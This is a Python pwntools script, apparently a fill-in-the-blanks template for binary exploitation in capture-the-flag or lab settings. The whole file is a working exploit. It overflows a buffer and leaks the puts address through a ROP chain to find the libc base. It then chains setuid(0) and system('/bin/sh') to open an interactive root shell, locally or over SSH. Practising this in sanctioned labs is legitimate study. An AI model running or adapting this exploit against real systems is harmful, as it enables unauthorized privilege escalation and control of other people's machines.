from pwn import * 

context.update(arch="amd64", os='linux', log_level="info")

TARGET = ("") # Enter the path to vunerable file
Bin = ELF(TARGET)
Rop = ROP(Bin)
libc = ELF("") # Enter the path of the libc file the Target uses
Offset = cyclic_find() # Enter the address found 

Connection = ssh(host="", user="", keyfile="key") # Enter ip and user if file is over ssh otherwise hash it out
p = Connection.system(TARGET)
#p = process(TARGET) # If file is local get rid of the first hashtag on this line 
pause() # Use to attach to gdb

out = p.readline()
log.info("%s", out)
log.debug("Payload")

# Find Addresses 
Pop_rdi = Rop.find_gadget(["pop rdi", "ret"])[0]
Ret = Rop.find_gadget(["ret"])[0]
log.info("%s", hex(Ret))
Puts_plt = Bin.plt["puts"]
Puts_got = Bin.got["puts"]
Main = Bin.sym["vuln"]

log.info("PUTD %s", hex(Puts_plt))
# First Payload

payload = b""
payload += b"A" * Offset
payload += p64(Pop_rdi)
payload += p64(Puts_got)
payload += p64(Puts_plt)
payload += p64(Main)

p.sendline(payload)

# Find libc leaked address 
out = p.readuntil(":(") # Change this to fit with Target file
log.info("%s", out)

Val = p.readline()
Val = p.readline()
Val = p.readline()
log.info("VAL %s", Val)
Leak = u64(Val.strip().ljust(8,b"\x00"))
log.info("Address is %s ", hex(Leak)) # Outputs Leaked address

pause()

libc_base = Leak - libc.symbols["puts"] # Calculates the correct base address of libc 
log.info("LIBC Base: %s", hex(libc_base))

#  Different Libc memory addresses 
Sh = next(libc.search(b"/bin/sh"))
log.info("Sh found at %s", hex(Sh))

System = libc.sym["system"]
log.info("System found at %s", hex(System))

Exit = libc.symbols["exit"]
log.info("Exit found at %s", hex(Exit))

Setuid = libc.symbols["setuid"]
log.info("Setuid found at %s", hex(Setuid))

# Creates the correct offsets for Memory address above 
Sys_offset = System + libc_base
Exit_offset = Exit + libc_base
Setuid_offset = Setuid + libc_base
Sh_offset = Sh + libc_base

# Second Payload
payload = b"A" * Offset
payload += p64(Ret)
payload += p64(Pop_rdi)
payload += p64(0x0)
payload += p64(Setuid_offset)
payload += p64(Pop_rdi)
payload += p64(Sh_offset)
payload += p64(Sys_offset)
payload += p64(Exit_offset)

p.sendline(payload)
p.interactive()